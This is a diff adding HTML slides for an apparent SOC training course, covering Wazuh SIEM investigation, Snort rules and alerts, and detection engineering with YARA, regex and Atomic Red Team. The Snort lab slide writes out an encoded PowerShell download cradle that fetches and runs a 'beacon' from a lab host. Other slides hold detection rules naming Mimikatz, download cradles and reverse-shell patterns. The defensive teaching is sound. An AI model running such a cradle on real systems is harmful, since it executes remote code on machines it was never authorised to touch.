+    <li><code>command_line: *vssadmin*</code> — did your ransomware rule fire?</li>
+    <li>Check the <strong>Alerts</strong> tab — what rule IDs were triggered?</li>
+  </ul>
+</div>
+
+<!-- SLIDE 72: CHALLENGE -->
+<div class="slide" data-module="Module 07: SIEM Lab">
+  <div class="slide-header"><h2>Challenge: Find the Intrusion</h2><span class="slide-num">CHALLENGE</span></div>
+  <p>I planted evidence of a multi-stage attack in the logs. Use Wazuh to answer these questions. Click each to check your answers:</p>
+  <div class="quiz-option" onclick="this.querySelector('.quiz-answer').style.display='block'">
+    1. What time was a new local user "backupadmin" created?
+    <div class="quiz-answer">Search: <code>data.win.system.eventID: 4720 AND data.user: backupadmin</code> (Event 4720 = user created). Note the exact timestamp.</div>
+  </div>
+  <div class="quiz-option" onclick="this.querySelector('.quiz-answer').style.display='block'">
+    2. What was the command line of the PowerShell encoded command?
+    <div class="quiz-answer">Search: <code>data.win.system.eventID: 1 AND image: *powershell* AND command_line: *-Enc*</code>. Use the Sysmon EID 1 field to extract the full command line.</div>
+  </div>
+  <div class="quiz-option" onclick="this.querySelector('.quiz-answer').style.display='block'">
+    3. What IP did the beacon connect to and on what port?
+    <div class="quiz-answer">Search: <code>data.win.system.eventID: 3 AND image: *powershell*</code> (Sysmon EID 3 = network connection). Look at <code>destination.ip</code> and <code>destination.port</code>.</div>
+  </div>
+  <div class="quiz-option" onclick="this.querySelector('.quiz-answer').style.display='block'">
+    4. How many failed logins occurred after the user was created?
+    <div class="quiz-answer">Search: <code>data.win.system.eventID: 4625 AND data.user: backupadmin</code> after the user creation timestamp. Use <code>| stats count</code>.</div>
+  </div>
+</div>
+
+<!-- SLIDE 73: M07 SUMMARY -->
+<div class="slide" data-module="Module 07: SIEM Lab">
+  <div style="text-align:center;">
+    <h2 style="color:var(--text);margin-bottom:16px;">Module 07 Complete</h2>
+    <div style="font-size:80px;margin-bottom:24px;">
+      <i class="fa-regular fa-circle-check" style="color:var(--green);"></i>
+    </div>
+    <p style="font-size:22px;color:var(--text);margin-bottom:16px;">You can now:</p>
+    <div style="display:flex;flex-direction:column;align-items:center;gap:8px;margin:0 auto 24px;font-size:17px;max-width:500px;">
+      <div class="card">Install a Wazuh SIEM from scratch (server + agent)</div>
+      <div class="card">Ingest Windows Event Logs and Sysmon into a SIEM</div>
+      <div class="card">Write custom correlation rules (XML rules + MITRE mapping)</div>
+      <div class="card">Build a SOC dashboard with key metrics</div>
+      <div class="card">Investigate simulated attacks using SIEM searches</div>
+    </div>
+    <div style="padding:16px;border:1px solid var(--border);border-radius:8px;background:var(--slide-bg);max-width:500px;margin:0 auto;">
+      <p style="font-size:15px;color:var(--accent);font-weight:600;">Before Module 09 (IDS/IPS with Snort):</p>
+      <p style="font-size:14px;color:var(--muted);">Keep your Wazuh lab running. You'll feed Snort alerts into it in the next module.</p>
+    </div>
+    <p style="margin-top:20px;font-size:14px;color:var(--muted);">
+      <a href="#" onclick="showSlide(0);return false;" style="color:var(--accent);">← Back to Dashboard</a>
+    </p>
+  </div>
+</div>
+
+<!-- ================================================================================== -->
+<!-- MODULE 09: IDS/IPS WITH SNORT — 5 slides                                              -->
+<!-- ================================================================================== -->
+
+<!-- SLIDE 1: M09 TITLE -->
+<div class="slide" data-module="Module 09: IDS/IPS with Snort">
+  <div style="text-align:center;">
+    <div style="font-family:'JetBrains Mono';color:var(--accent);margin-bottom:16px;">MODULE 09</div>
+    <h1>IDS/IPS with Snort</h1>
+    <p style="margin-top:32px;max-width:500px;margin-left:auto;margin-right:auto;">Snort is the most widely deployed open-source intrusion detection system. Learn to write rules, read alerts, and correlate IDS events with your SIEM.</p>
+    <div style="margin-top:24px;">
+      <i class="fa-solid fa-shield-halved fa-3x" style="margin:0 12px;color:var(--accent);"></i>
+      <i class="fa-solid fa-traffic-light fa-3x" style="margin:0 12px;color:var(--accent2);"></i>
+      <i class="fa-solid fa-diagram-project fa-3x" style="margin:0 12px;color:var(--green);"></i>
+    </div>
+    <p style="margin-top:32px;font-size:15px;">5 slides -- press <strong>Next</strong> to start</p>
+  </div>
+</div>
+
+<!-- SLIDE 2: SNORT MODES -->
+<div class="slide" data-module="Module 09: IDS/IPS with Snort">
+  <div class="slide-header"><h2>Snort: Three Modes</h2><span class="slide-num">FUNDAMENTALS</span></div>
+  <p>Snort runs in three distinct modes. Most SOC analysts will work with NIDS mode alerts, but knowing all three helps in lab testing.</p>
+  <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;margin-top:16px;">
+    <div class="card" style="text-align:center;border-left:3px solid var(--accent);">
+      <p style="font-size:15px;font-weight:600;">Sniffer</p>
+      <p style="font-size:13px;">Reads packets from the wire and prints them to stdout. Useful for debugging, not production.</p>
+    </div>
+    <div class="card" style="text-align:center;border-left:3px solid var(--green);">
+      <p style="font-size:15px;font-weight:600;">Packet Logger</p>
+      <p style="font-size:13px;">Logs packets to disk in tcpdump format. Can replay later for analysis.</p>
+    </div>
+    <div class="card" style="text-align:center;border-left:3px solid var(--red);">
+      <p style="font-size:15px;font-weight:600;">NIDS</p>
+      <p style="font-size:13px;">Evaluates traffic against rules and generates alerts. This is the mode you'll use in a SOC.</p>
+    </div>
+  </div>
+  <div class="terminal" style="margin-top:12px;">
+    <span class="comment"># Sniffer: read packets live</span><br>
+    <span class="prompt">$</span> <span class="cmd">sudo snort -v -i eth0</span><br><br>
+    <span class="comment"># Packet Logger: write to disk</span><br>
+    <span class="prompt">$</span> <span class="cmd">sudo snort -l /var/log/snort -i eth0</span><br><br>
+    <span class="comment"># NIDS: load rules and alert</span><br>
+    <span class="prompt">$</span> <span class="cmd">sudo snort -c /etc/snort/snort.conf -i eth0 -A fast</span>
+  </div>
+</div>
+
+<!-- SLIDE 3: SNORT RULE SYNTAX -->
+<div class="slide" data-module="Module 09: IDS/IPS with Snort">
+  <div class="slide-header"><h2>Snort Rule Syntax</h2><span class="slide-num">RULES</span></div>
+  <p>Every Snort rule has a <strong>rule header</strong> (action, protocol, source, destination) and <strong>rule options</strong> (what to match inside the packet).</p>
+  <div class="terminal" style="font-size:13px;">
+    <span class="comment"># Rule structure</span><br>
+    <span style="color:#64748b;">
+<span class="hl">alert</span> <span class="hl">tcp</span> $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (<br>
+  <span class="hl">msg</span>:"ET MALWARE Cobalt Strike Beacon Detected";<br>
+  <span class="hl">content</span>:"|0d 0a|Server: Apache|0d 0a|"; <span class="hl">distance</span>:0;<br>
+  <span class="hl">sid</span>:2025001; <span class="hl">rev</span>:1;<br>
+  <span class="hl">classtype</span>:trojan-activity;<br>
+  <span class="hl">reference</span>:url,threatfox.example.com;<br>
+)
+    </span>
+  </div>
+  <table class="tbl" style="margin-top:8px;">
+    <tr><th>Field</th><th>Purpose</th><th>Example</th></tr>
+    <tr><td><code>alert</code></td><td>Action: alert, log, drop, reject</td><td>Alert the SOC</td></tr>
+    <tr><td><code>tcp</code></td><td>Protocol: tcp, udp, icmp, ip</td><td>TCP-based attack</td></tr>
+    <tr><td><code>$HOME_NET</code></td><td>Source/destination variable</td><td>Your internal network</td></tr>
+    <tr><td><code>content</code></td><td>Match byte sequence in payload</td><td>HTTP header pattern</td></tr>
+    <tr><td><code>sid</code></td><td>Unique rule ID</td><td>Use 1,000,000+ for custom rules</td></tr>
+    <tr><td><code>classtype</code></td><td>Attack classification</td><td>Maps to priority</td></tr>
+  </table>
+  <p style="margin-top:8px;font-size:14px;color:var(--yellow);">The Emerging Threats (ET) open rule set ships thousands of rules. You can write custom rules to detect internal threats your environment cares about.</p>
+</div>
+
+<!-- SLIDE 4: READING SNORT ALERTS -->
+<div class="slide" data-module="Module 09: IDS/IPS with Snort">
+  <div class="slide-header"><h2>Reading Snort Alerts</h2><span class="slide-num">ALERTS</span></div>
+  <p>Snort writes alerts to <code>/var/log/snort/alert</code> (fast mode) or <code>alert.json</code> (unified2). Every alert includes the matching rule, source/destination, and timestamp.</p>
+  <div class="terminal" style="font-size:12px;">
+    <span class="comment"># /var/log/snort/alert — fast mode output</span><br>
+    <span style="color:#64748b;">
+07/06-10:15:23.123456  [**] [1:2025001:1] ET MALWARE Cobalt Strike Beacon Detected [**]<br>
+[Classification: Trojan Activity] [Priority: 1]<br>
+<span class="hl">TCP</span> <span class="hl">10.0.0.5:49152</span> -> <span class="hl">185.234.72.18:443</span><br><br>
+07/06-10:15:24.654321  [**] [1:2025002:1] ET POLICY Outbound DNS Query to Suspicious Domain [**]<br>
+[Classification: Policy Violation] [Priority: 3]<br>
+<span class="hl">UDP</span> <span class="hl">10.0.0.5:54321</span> -> <span class="hl">192.168.1.2:53</span>
+    </span>
+  </div>
+  <p style="margin-top:8px;font-weight:600;">Alert fields decoded:</p>
+  <ul style="margin-top:4px;font-size:15px;color:var(--muted);">
+    <li><strong>[1:2025001:1]</strong> — <code>generator_id:sid:revision</code>. The SID identifies the exact rule.</li>
+    <li><strong>Priority 1</strong> — Most severe (attempted admin, trojan). Priority 3 is informational.</li>
+    <li><strong>Source → Destination</strong> — IP and port of both sides of the connection.</li>
+  </ul>
+  <p style="margin-top:8px;font-size:14px;color:var(--yellow);">Correlate Snort alerts with Sysmon EID 3 (network connection) in your SIEM. If both fire for the same IP, confidence is high.</p>
+</div>
+
+<!-- SLIDE 5: LAB — SNORT + WAZUH -->
+<div class="slide" data-module="Module 09: IDS/IPS with Snort">
+  <div class="slide-header"><h2>Lab: Snort + Wazuh</h2><span class="slide-num">LAB</span></div>
+  <p>Install Snort on your Wazuh server (or a separate Linux VM) and configure it to send alerts to Wazuh for correlation.</p>
+  <p style="margin-top:8px;font-weight:600;color:var(--accent);">Step 1: Install Snort</p>
+  <div class="terminal" style="font-size:13px;">
+    <span class="prompt">$</span> <span class="cmd">sudo apt install snort</span><br>
+    <span class="comment"># During install, set HOME_NET to your lab subnet, e.g. 192.168.1.0/24</span>
+  </div>
+  <p style="margin-top:8px;font-weight:600;color:var(--accent);">Step 2: Test with a custom rule</p>
+  <div class="terminal" style="font-size:13px;">
+    <span class="comment"># Add a rule to detect PowerShell download cradle (common C2 pattern)</span><br>
+    <span class="prompt">$</span> <span class="cmd">echo 'alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"SOC LAB - PowerShell Download Cradle"; content:"IEX"; content:"DownloadString"; distance:0; sid:9990001; rev:1;)' | sudo tee -a /etc/snort/rules/local.rules</span><br><br>
+    <span class="prompt">$</span> <span class="cmd">sudo snort -c /etc/snort/snort.conf -i eth0 -A fast</span>
+  </div>
+  <p style="margin-top:8px;font-weight:600;color:var(--accent);">Step 3: Trigger and correlate</p>
+  <div class="terminal" style="font-size:13px;">
+    <span class="comment"># From your Windows agent, run the encoded PowerShell from Module 02</span><br>
+    <span class="prompt">PS&gt;</span> <span class="cmd">powershell.exe -EncodedCommand SQBFAFgAKABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAyAC8AYgBlAGEAYwBvAG4AJwApAA==</span><br><br>
+    <span class="comment"># Check Snort alert:</span><br>
+    <span class="prompt">$</span> <span class="cmd">sudo tail -f /var/log/snort/alert | grep "SOC LAB"</span><br><br>
+    <span class="comment"># Now search for the same PowerShell process in Wazuh:</span><br>
+    <span class="comment"># Query: data.win.system.eventID: 1 AND data.win.eventdata.commandLine: *DownloadString*</span>
+  </div>
+  <p style="margin-top:8px;font-size:13px;color:var(--yellow);">You should see the alert in <strong>both</strong> Snort and Wazuh — network layer + endpoint layer confirming the same malicious activity.</p>
+</div>
+
+<!-- ================================================================================== -->
+<!-- MODULE 06: DETECTION ENGINEERING — 13 slides                                        -->
+<!-- ================================================================================== -->
+
+<!-- SLIDE 74: M06 TITLE -->
+<div class="slide" data-module="Module 06: Detection Engineering">
+  <div style="text-align:center;">
+    <div style="font-family:'JetBrains Mono';color:var(--accent);margin-bottom:16px;">MODULE 06</div>
+    <h1>Detection Engineering<br>From Alerts to Actionable Detections</h1>
+    <p style="margin-top:32px;max-width:500px;margin-left:auto;margin-right:auto;">Detection lifecycle, quality metrics, tuning, and testing. Write detections that catch real threats without drowning in false positives.</p>
+    <div style="margin-top:24px;">
+      <i class="fa-solid fa-magnifying-glass-chart fa-3x" style="margin:0 12px;color:var(--accent);"></i>
+      <i class="fa-solid fa-code fa-3x" style="margin:0 12px;color:var(--accent2);"></i>
+      <i class="fa-solid fa-vial fa-3x" style="margin:0 12px;color:var(--green);"></i>
+    </div>
+    <p style="margin-top:32px;font-size:15px;">13 slides -- press <strong>Next</strong> to start</p>
+  </div>
+</div>
+
+<!-- SLIDE 75: WHAT IS DETECTION ENGINEERING -->
+<div class="slide" data-module="Module 06: Detection Engineering">
+  <div class="slide-header"><h2>What is Detection Engineering?</h2><span class="slide-num">CORE</span></div>
+  <p><strong>Detection Engineering</strong> is the systematic creation, testing, and maintenance of detection logic that identifies malicious activity from security telemetry.</p>
+  <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;margin-top:16px;">
+    <div class="card">
+      <p style="font-size:14px;font-weight:600;color:var(--accent);">vs. Incident Response</p>
+      <p style="font-size:14px;">IR is reactive -- you respond after an alert fires. DE is proactive -- you build the alert before the attacker arrives.</p>
+    </div>
+    <div class="card">
+      <p style="font-size:14px;font-weight:600;color:var(--accent2);">vs. Threat Hunting</p>
+      <p style="font-size:14px;">Hunting is hypothesis-driven manual search. DE builds automated rules that hunt at machine speed, 24/7.</p>
+    </div>
+    <div class="card">
+      <p style="font-size:14px;font-weight:600;color:var(--green);">The Output</p>
+      <p style="font-size:14px;">Detection rules in standard formats: <strong>Sigma</strong> (log events), <strong>YARA</strong> (files), <strong>KQL/SPL</strong> (SIEM queries).</p>
+    </div>
+  </div>
+</div>
+
+<!-- SLIDE 76: IOC vs IOA -->
+<div class="slide" data-module="Module 06: Detection Engineering">
+  <div class="slide-header"><h2>IOC vs. IOA</h2><span class="slide-num">FUNDAMENTAL</span></div>
+  <p><strong>Indicators of Compromise (IOC)</strong> = known-bad artifacts left behind. <strong>Indicators of Attack (IOA)</strong> = behavioral patterns that indicate an attack in progress.</p>
+  <table class="tbl" style="margin-top:12px;">
+    <tr><th>Indicator Type</th><th>Example</th><th>Shelf Life</th><th>Detection Method</th></tr>
+    <tr><td><span style="color:var(--red);">IOC</span></td><td>File hash <code>e3c0a...</code></td><td>Hours to days</td><td>Hash lookup, blocklist</td></tr>
+    <tr><td><span style="color:var(--red);">IOC</span></td><td>Known C2 IP <code>5.2.68.12</code></td><td>Days to weeks</td><td>Threat intel feed</td></tr>
+    <tr><td><span style="color:var(--yellow);">IOA</span></td><td>WinWord spawning PowerShell</td><td>Years (behavior doesn't change)</td><td>Sigma rule on process ancestry</td></tr>
+    <tr><td><span style="color:var(--yellow);">IOA</span></td><td>LSASS minidump access</td><td>Years</td><td>Sysmon EID 10 + rule</td></tr>
+  </table>
+  <p style="margin-top:10px;font-size:15px;color:var(--yellow);"><i class="fa-solid fa-triangle-exclamation"></i> IOCs burn out fast. IOAs last forever. Detection Engineering focuses on IOA patterns.</p>
+</div>
+
+<!-- SLIDE 77: DETECTION LIFECYCLE -->
+<div class="slide" data-module="Module 06: Detection Engineering">
+  <div class="slide-header"><h2>Detection Lifecycle</h2><span class="slide-num">PROCESS</span></div>
+  <div style="display:flex;align-items:center;gap:8px;margin-top:16px;flex-wrap:wrap;justify-content:center;">
+    <div class="card" style="text-align:center;padding:14px;flex:1;min-width:100px;">
+      <div style="font-size:24px;color:var(--accent);">1</div>
+      <p style="font-size:13px;font-weight:600;">Idea</p>
+      <p style="font-size:12px;">New TTP identified</p>
+    </div>
+    <div style="font-size:20px;color:var(--muted);">→</div>
+    <div class="card" style="text-align:center;padding:14px;flex:1;min-width:100px;">
+      <div style="font-size:24px;color:var(--accent2);">2</div>
+      <p style="font-size:13px;font-weight:600;">Prototype</p>
+      <p style="font-size:12px;">Write Sigma/YARA draft</p>
+    </div>
+    <div style="font-size:20px;color:var(--muted);">→</div>
+    <div class="card" style="text-align:center;padding:14px;flex:1;min-width:100px;">
+      <div style="font-size:24px;color:var(--green);">3</div>
+      <p style="font-size:13px;font-weight:600;">Test</p>
+      <p style="font-size:12px;">Atomic Red Team validation</p>
+    </div>
+    <div style="font-size:20px;color:var(--muted);">→</div>
+    <div class="card" style="text-align:center;padding:14px;flex:1;min-width:100px;">
+      <div style="font-size:24px;color:var(--cyan);">4</div>
+      <p style="font-size:13px;font-weight:600;">Deploy</p>
+      <p style="font-size:12px;">Push to SIEM/EDR</p>
+    </div>
+    <div style="font-size:20px;color:var(--muted);">→</div>
+    <div class="card" style="text-align:center;padding:14px;flex:1;min-width:100px;">
+      <div style="font-size:24px;color:var(--orange);">5</div>
+      <p style="font-size:13px;font-weight:600;">Tune</p>
+      <p style="font-size:12px;">Reduce false positives</p>
+    </div>
+    <div style="font-size:20px;color:var(--muted);">→</div>
+    <div class="card" style="text-align:center;padding:14px;flex:1;min-width:100px;">
+      <div style="font-size:24px;color:var(--red);">6</div>
+      <p style="font-size:13px;font-weight:600;">Retire</p>
+      <p style="font-size:12px;">Remove when irrelevant</p>
+    </div>
+  </div>
+  <p style="margin-top:12px;font-size:14px;">DE is a loop, not a waterfall. Every detection degrades over time as environments change.</p>
+</div>
+
+
+
+
+<!-- SLIDE 81: YARA INTRO -->
+<div class="slide" data-module="Module 06: Detection Engineering">
+  <div class="slide-header"><h2>YARA Rules -- Intro</h2><span class="slide-num">FORMAT</span></div>
+  <p><strong>YARA</strong> is a pattern-matching tool for identifying malware files. Write rules based on strings, hex patterns, or file metadata.</p>
+  <div class="terminal" style="font-size:12px;">
+<span style="color:#c792ea;">rule</span> <span style="color:#ffcb6b;">Mimikatz_Detect</span> <span style="color:#fff;">{</span>
+  <span style="color:#c792ea;">meta:</span>
+    <span style="color:#c792ea;">description</span> <span style="color:#fff;">= "Detects Mimikatz binary or memory dump"</span>
+    <span style="color:#c792ea;">author</span> <span style="color:#fff;">= "SOC Academy"</span>
+    <span style="color:#c792ea;">date</span> <span style="color:#fff;">= "2025-01-01"</span>
+  <span style="color:#c792ea;">strings:</span>
+    <span style="color:#89ddff;">$s1</span> <span style="color:#fff;">= "mimikatz" nocase</span>
+    <span style="color:#89ddff;">$s2</span> <span style="color:#fff;">= "sekurlsa::logonpasswords" nocase</span>
+    <span style="color:#89ddff;">$s3</span> <span style="color:#fff;">= "kerberos" nocase</span>
+    <span style="color:#89ddff;">$hex1</span> <span style="color:#fff;">= { 6d 69 6d 69 6b 61 74 7a } <span class="comment">// "mimikatz" in hex</span></span>
+  <span style="color:#c792ea;">condition:</span>
+    <span style="color:#fff;">2 of ($s*) or $hex1</span>
+<span style="color:#fff;">}</span>
+  </div>
+  <p style="margin-top:8px;font-size:14px;">Use YARA to scan endpoints, memory dumps, email attachments, and malware repositories. <strong>yara64.exe -s rule.yara suspicious.exe</strong></p>
+</div>
+
+<!-- SLIDE 82: YARA DEEP DIVE -->
+<div class="slide" data-module="Module 06: Detection Engineering">
+  <div class="slide-header"><h2>YARA Deep Dive</h2><span class="slide-num">SYNTAX</span></div>
+  <p style="margin-bottom:8px;">YARA has three string types and powerful conditions:</p>
+  <table class="tbl">
+    <tr><th>Component</th><th>Description</th><th>Example</th></tr>
+    <tr><td><code>$text</code></td><td>Text string (case-sensitive by default)</td><td><code>$a = "http://"</code></td></tr>
+    <tr><td><code>$hex</code></td><td>Hex byte pattern with wildcards</td><td><code>$b = { 6d 69 ?? 6b }</code></td></tr>
+    <tr><td><code>$regex</code></td><td>Regular expression match</td><td><code>$c = /https?:\/\/[^\/]+/</code></td></tr>
+    <tr><td><code>condition</code></td><td>Boolean logic on matches</td><td><code>all of them</code>, <code>#a &gt; 5</code></td></tr>
+    <tr><td><code>pe</code> module</td><td>Check PE headers, sections, imports</td><td><code>pe.sections[1].name == ".text"</code></td></tr>
+  </table>
+  <p style="margin-top:10px;font-weight:600;">Performance Tips:</p>
+  <ul style="font-size:15px;margin-top:6px;">
+    <li>Anchor strings: <code>$ = "MZ"</code> at file start (<code>$ at 0</code>)</li>
+    <li>Avoid too-wide hex wildcards (<code>{ ?? ?? ?? }</code> is slow)</li>
+    <li>Use <code>pe</code> module to gate on PE header before scanning strings</li>
+  </ul>
+</div>
+
+
+<!-- SLIDE 84: REGEX FOR DETECTION -->
+<div class="slide" data-module="Module 06: Detection Engineering">
+  <div class="slide-header"><h2>Regex for Detection</h2><span class="slide-num">SKILL</span></div>
+  <table class="tbl">
+    <tr><th>Pattern</th><th>Matches</th><th>Use Case</th></tr>
+    <tr><td><code>\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b</code></td><td>IPv4 addresses</td><td>C2 IPs, exfiltration targets</td></tr>
+    <tr><td><code>[A-Za-z0-9+/]{40,}={0,2}</code></td><td>Base64-encoded strings</td><td>Encoded PowerShell, hidden data</td></tr>
+    <tr><td><code>[A-Fa-f0-9]{64}</code></td><td>SHA256 hashes</td><td>File hash IOCs</td></tr>
+    <tr><td><code>\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{2,5}\b</code></td><td>IP:Port combinations</td><td>C2 beaconing, reverse shells</td></tr>
+    <tr><td><code>-EncodedCommand\s+[A-Za-z0-9+/]+={0,2}</code></td><td>PowerShell -EncodedCommand</td><td>Phishing, macro-based attacks</td></tr>
+    <tr><td><code>[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}</code></td><td>Domain names</td><td>DGA detection, log analysis</td></tr>
+  </table>
+  <p style="margin-top:8px;font-size:14px;color:var(--yellow);">Use regex sparingly in high-volume log sources -- unanchored regex is expensive. Prefer <code>contains</code> or <code>endswith</code> in Sigma when possible.</p>
+</div>
+
+<!-- SLIDE 85: DETECTION SOURCES -->
+<div class="slide" data-module="Module 06: Detection Engineering">
+  <div class="slide-header"><h2>Detection Data Sources</h2><span class="slide-num">TELEMETRY</span></div>
+  <table class="tbl">
+    <tr><th>Source</th><th>Example Events</th><th>Best For</th></tr>
+    <tr><td><strong>Windows Event Logs</strong></td><td>EID 4688, 4624, 4657, 4698</td><td>Process creation, logons, registry, scheduled tasks</td></tr>
+    <tr><td><strong>Sysmon</strong></td><td>EID 1, 3, 7, 10, 11, 22</td><td>Process ancestry, network, DLL loading, registry, DNS</td></tr>
+    <tr><td><strong>ETW</strong></td><td>.NET events, AMSI, UMCI</td><td>In-memory execution, script block logging</td></tr>
+    <tr><td><strong>DNS Logs</strong></td><td>Query names, response IPs</td><td>C2, DGA, data exfiltration, tunneling</td></tr>
+    <tr><td><strong>Network Flow</strong></td><td>Conn durations, byte counts</td><td>Beaconing, data exfil, port scans</td></tr>
+    <tr><td><strong>EDR Telemetry</strong></td><td>Process trees, file ops, registry ops</td><td>Automated response, deep investigation</td></tr>
+  </table>
+  <p style="margin-top:8px;font-size:14px;">Best detections combine <strong>multiple sources</strong>. Example: Sysmon EID 1 + EID 3 = full process-to-C2 chain.</p>
+</div>
+
+<!-- SLIDE 86: DETECTION QUALITY -->
+<div class="slide" data-module="Module 06: Detection Engineering">
+  <div class="slide-header"><h2>Detection Quality Metrics</h2><span class="slide-num">MATH</span></div>
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:12px;">
+    <div class="card">
+      <p style="font-size:14px;font-weight:600;color:var(--green);">True Positive (TP)</p>
+      <p style="font-size:14px;">Correct alert on malicious behavior</p>
+    </div>
+    <div class="card">
+      <p style="font-size:14px;font-weight:600;color:var(--red);">False Positive (FP)</p>
+      <p style="font-size:14px;">Alert on benign behavior</p>
+    </div>
+    <div class="card">
+      <p style="font-size:14px;font-weight:600;color:var(--green);">True Negative (TN)</p>
+      <p style="font-size:14px;">No alert on benign behavior</p>
+    </div>
+    <div class="card">
+      <p style="font-size:14px;font-weight:600;color:var(--red);">False Negative (FN)</p>
+      <p style="font-size:14px;">No alert on malicious behavior (worst case)</p>
+    </div>
+  </div>
+  <div style="margin-top:12px;padding:12px;background:var(--slide-bg);border:1px solid var(--border);border-radius:8px;">
+    <p style="font-size:15px;"><strong>Precision</strong> = TP / (TP + FP) -- "How many alerts are real?"</p>
+    <p style="font-size:15px;"><strong>Recall</strong> = TP / (TP + FN) -- "How many attacks do we catch?"</p>
+    <p style="font-size:15px;"><strong>F1</strong> = 2 x (Precision x Recall) / (Precision + Recall) -- "Balanced score"</p>
+  </div>
+  <p style="margin-top:8px;font-size:14px;">SOC analysts care most about FP reduction. A noisy rule gets ignored or disabled.</p>
+</div>
+
+<!-- SLIDE 87: TUNING DETECTIONS -->
+<div class="slide" data-module="Module 06: Detection Engineering">
+  <div class="slide-header"><h2>Tuning Detections</h2><span class="slide-num">OPTIMIZE</span></div>
+  <p>Every detection starts noisy. Tuning reduces FP without losing TP.</p>
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:12px;">
+    <div class="card" style="border-left:3px solid var(--accent);">
+      <p style="font-size:15px;font-weight:600;">Whitelisting</p>
+      <p style="font-size:13px;">Exclude known-good paths, users, processes. Skip legitimate services.</p>
+    </div>
+    <div class="card" style="border-left:3px solid var(--green);">
+      <p style="font-size:15px;font-weight:600;">Thresholding</p>
+      <p style="font-size:13px;">Alert only after N events in X minutes. Reduces noise from one-off actions.</p>
+    </div>
+    <div class="card" style="border-left:3px solid var(--orange);">
+      <p style="font-size:15px;font-weight:600;">Context Filtering</p>
+      <p style="font-size:13px;">Add parent process validation to separate phish from admin execution.</p>
+    </div>
+    <div class="card" style="border-left:3px solid var(--purple);">
+      <p style="font-size:15px;font-weight:600;">Layered Detection</p>
+      <p style="font-size:13px;">Detect same technique at different levels. If one layer fires alone, lower severity.</p>
+    </div>
+  </div>
+</div>
+
+<!-- SLIDE 88: DETECTION AS CODE -->
+<div class="slide" data-module="Module 06: Detection Engineering">
+  <div class="slide-header"><h2>Detection as Code</h2><span class="slide-num">DaC</span></div>
+  <p>Treat detection rules like software: version control, code review, CI/CD pipeline.</p>
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:12px;">
+    <div class="card">
+      <p style="font-size:14px;font-weight:600;color:var(--accent);">Git Repository</p>
+      <p style="font-size:13px;">Store all Sigma/YARA rules in a Git repo. Track changes, authors, rollbacks.</p>
+    </div>
+    <div class="card">
+      <p style="font-size:14px;font-weight:600;color:var(--accent2);">Code Review</p>
+      <p style="font-size:13px;">Peer review every rule before deploy. Catch logic errors and FP gaps.</p>
+    </div>
+    <div class="card">
+      <p style="font-size:14px;font-weight:600;color:var(--green);">CI/CD Pipeline</p>
+      <p style="font-size:13px;">Auto-test, convert, deploy. GitHub Actions validate syntax, run Atomic tests.</p>
+    </div>
+    <div class="card">
+      <p style="font-size:14px;font-weight:600;color:var(--orange);">Rollback</p>
+      <p style="font-size:13px;">FP spike after deploy? One git revert reverses the change.</p>
+    </div>
+  </div>
+  <p style="margin-top:10px;font-size:14px;color:var(--yellow);">DaC prevents "who wrote that rule?" and "why was this changed?" mysteries.</p>
+</div>
+
+<!-- SLIDE 89: TESTING DETECTIONS -->
+<div class="slide" data-module="Module 06: Detection Engineering">
+  <div class="slide-header"><h2>Testing Detections</h2><span class="slide-num">VALIDATE</span></div>
+  <p>Never deploy a rule without testing. Use <strong>Atomic Red Team</strong> -- open-source adversary emulation mapped to MITRE ATT&amp;CK.</p>
+  <div class="terminal" style="font-size:13px;">
+<span class="prompt">PS&gt;</span><span class="cmd"> Install-Module -Name AtomicRedTeam -Force</span>
+<span class="prompt">PS&gt;</span><span class="cmd"> Invoke-AtomicTest T1059.001 -TestNumbers 1</span>
+<span class="comment"># Runs "PowerShell File Download" -- tests your download detection</span>
+<span class="ok">[+] Test T1059.001-1 executed successfully</span>
+<span class="comment"># Check SIEM for alert. If no alert detection gap.</span>
+  </div>
+  <p style="margin-top:8px;font-size:14px;">Testing workflow:</p>
+  <ol style="font-size:15px;color:var(--muted);margin-top:6px;margin-left:20px;">
+    <li>Write Sigma rule for technique X</li>
+    <li>Run <code>Invoke-AtomicTest TXXXXX</code></li>
+    <li>Verify alert fired in SIEM</li>
+    <li>If not: debug rule logic, log source, or ingestion</li>
+    <li>Once TP confirmed, deploy to production</li>
+  </ol>
+</div>
+
+
+
+
+<!-- SLIDE 93: M06 SUMMARY -->
+<div class="slide" data-module="Module 06: Detection Engineering">
+  <div style="text-align:center;">
+    <h2 style="color:var(--text);margin-bottom:16px;">Module 06 Complete</h2>
+    <div style="font-size:80px;margin-bottom:24px;">
+      <i class="fa-regular fa-circle-check" style="color:var(--green);"></i>
+    </div>
+    <p style="font-size:22px;color:var(--text);margin-bottom:16px;">You can now:</p>
+    <div style="display:flex;flex-direction:column;align-items:center;gap:8px;margin:0 auto 24px;font-size:17px;max-width:500px;">
+      <div class="card">Write Sigma rules from scratch</div>
+      <div class="card">Write YARA rules to identify malware files</div>
+      <div class="card">Use regex effectively in detection logic</div>
+      <div class="card">Measure detection quality: TP, FP, Precision, Recall</div>
+      <div class="card">Test detections with Atomic Red Team</div>
+      <div class="card">Map detection gaps against MITRE ATT&amp;CK</div>
+    </div>
+    <div style="padding:16px;border:1px solid var(--border);border-radius:8px;background:var(--slide-bg);max-width:500px;margin:0 auto;">
+      <p style="font-size:15px;color:var(--accent);font-weight:600;">Next: Module 08 (EDR Foundations)</p>
+      <p style="font-size:14px;color:var(--muted);">Apply your detection skills to endpoint telemetry. Process trees, registry monitoring, and automated response.</p>
+    </div>
+    <p style="margin-top:20px;font-size:14px;color:var(--muted);">
+      <a href="#" onclick="showSlide(0);return false;" style="color:var(--accent);">← Back to Dashboard</a>
+    </p>
+  </div>
+</div>
+
